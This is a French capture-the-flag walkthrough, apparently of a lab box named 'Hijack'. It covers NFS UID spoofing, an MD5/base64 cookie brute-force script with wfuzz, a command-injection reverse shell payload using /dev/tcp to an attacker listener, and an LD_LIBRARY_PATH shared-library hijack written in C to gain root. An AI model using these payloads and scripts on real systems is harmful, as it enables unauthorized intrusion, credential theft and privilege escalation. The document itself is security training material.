
- **IP**
```
10.82.178.237
```

On commence par un scan nmap:

![[Hijack/file/nmap.png]]

Nous allons exploiter le port **NFS**

```
sudo /sbin/showmount -e 10.82.178.237
```

![[showmount.png]]

On trouve ici un dossier de partage. On va monter ce dossier:

```
mkdir share
sudo mount -t nfs 10.82.178.237:/mnt/share share/
```

On va maintenant y accéder:

![[access_share.png]]
On voit une **permission non accordé**. On va essayer de voir L'**UID** du dossier

![[droit_share.png]]

On va créer un user dans notre machine local avec l'UID **1003** et le GID **1003**

```
sudo useradd fakeuser
sudo usermod -u 1003 fakeuser
sudo groupmod -g 1003 fakeuser
sudo su fakeuser
```

On peut maintenant accéder au dossier **/share**.  On peut trouver ça dedans

![[ftp_credentials.png]]

On peut maintenant se connecter via ftp avec ces credentials

![[ftp_content.png]]

On a ici un fichier qui contient la liste des mots de passe et message venant de l'admin.

![[from_admin.png]]

![[password_list.png]]

D'après le message, il y a un user appelé : **rick** et **admin**. Leurs mdp sont surrement dans la liste des mots de passe

Quand on visite le site web:

![[Hijack/file/web.png]]

On peut pas encore accéder au panel d'administration. Donc on va essayer de se connecter:

![[test_password.png]]

Ça dit que le mot de passe est incorrect, Le username **Admin** existe bel et bien. On peut pas faire un bruteforce car c'est bloqué après plus de cinq tentatives. On va donc créer un nouveau utilisateur.

![[web_test_welcome.png]]
Quand on est connecté, on a un cookie

![[cookie.png]]

Ce cookie correspond au mot de passe de l'utilisateur **test** chiffré en **MD5**. On peut abuser de ça, on sait que le mot de passe de l'admin se trouve dans la liste de mot de passe qu'on a trouvé ultérieurement.  Nous pouvons donc créer toutes les valeurs possibles pour le cookie en utilisant le nom d'utilisateur « admin » et les hachages de tous les mots de passe de la liste, puis les encoder en base64 pour qu'ils correspondent au format du cookie. On peut faire tout ça grâce au script suivant:

```
import hashlib
import base64

# Open the file and read its lines
with open('.passwords_list.txt', 'r') as f:
    lines = f.readlines()

# Loop through the lines and modify each one
for line in lines:
    # Strip the line of bad characters
    stripped_line = ''.join(filter(str.isalnum, line))
    # Hash the stripped line using MD5
    hashed_line = hashlib.md5(stripped_line.encode('utf-8')).hexdigest()
    # Add "admin:" to the beginning of the hash
    modified_hash = 'admin:' + hashed_line
    # Encode the modified hash to base64
    encoded_hash = base64.b64encode(modified_hash.encode('utf-8'))
    # Print the encoded hash
    print(encoded_hash.decode('ascii'))
```

```
python3 conv.py
```

On lance la commande et copier la sortie dans un fichier appelé `list`. On va utiliser cette liste pour bruteforcer le cookie avec `wfuzz`

```
wfuzz -u http://10.82.178.237/administration.php -w list -X POST -b 'PHPSESSID= FUZZ' --hh 51
```

![[wfuzz.png]]

On remplace la valeur du cookie et on obtient le panel Admin

![[web_admin.png]]

![[web_amin_pannel.png]]

Là on trouve un système qui permet de savoir le statut d'un service. On sait que notre serveur web est apache. On va voir le statut de apache

![[web_apach_status.png]]

Maintenant on va faire un test de RCE:


![[web_RCE_test.png]]

On sait que c'est vulnérable au **RCE**. On va ouvrir un serveur en écoute et envoyer un payload

```
nc -lvnp 4444
```

```
& bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"
```

On obtient un shell. Et il y a un fichier appelé `config.php`

![[confi_php.png]]

Là on a des credentials pour l'utilisateur `rick`.

```
su rick
```

Là on peut avoir le **user.flag**. Pour trouver comment élever notre privilège, on tape la commande `sudo -l` et on trouve

![[sudoL.png]]
On peut pas  exécuter `/usr/bin/apache2` en tant que root mais il y a une chose intéressante dans la sortie: `env_keep+=LD_LIBRARY_PATH`.
La déclaration `env_keep+=LD_LIBRARY_PATH` ordonne à `sudo` de préserver la valeur de la variable d'environnement `LD_LIBRARY_PATH` lorsqu'un utilisateur exécute une commande avec des privilèges élevés. `LD_LIBRARY_PATH` est une variable d'environnement qui spécifie une liste de répertoires où le système doit rechercher des bibliothèques partagées lors de l'exécution d'un programme.

Le danger de cette configuration réside dans le fait que si un utilisateur non privilégié peut modifier `LD_LIBRARY_PATH` avant d'exécuter une commande avec `sudo`, il pourrait potentiellement faire pointer cette variable vers un répertoire contenant une version malveillante d'une bibliothèque partagée utilisée par le programme exécuté avec des privilèges élevés. Lorsque le programme s'exécute, il chargerait la bibliothèque malveillante à partir du répertoire spécifié dans `LD_LIBRARY_PATH` avant de rechercher la bibliothèque légitime, ce qui pourrait permettre à l'utilisateur non privilégié d'exécuter du code avec des privilèges élevés.

Nous allons d'abord lister les librairies partagés de apache:

```
ldd /usr/sbin/apache2
```

![[liste_service_apache.png]]

Nous allons choisir `libcrypt.so.1` . Nous allons créer un vichier .c qui va contenir le code malveillant:

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Ce code permet de hijack l'exécution des flows en manipulant le variable d'environnement `LD_LIBRARY_PATH`

```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/rick/malicious_code.c
```

![[hijacking.png]]

On va maintenant utiliser la commande `sudo` et changer  `LD_LIBRARY_PATH` vers `/tmp`

```
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

![[Hijack/file/rootflag.png]]
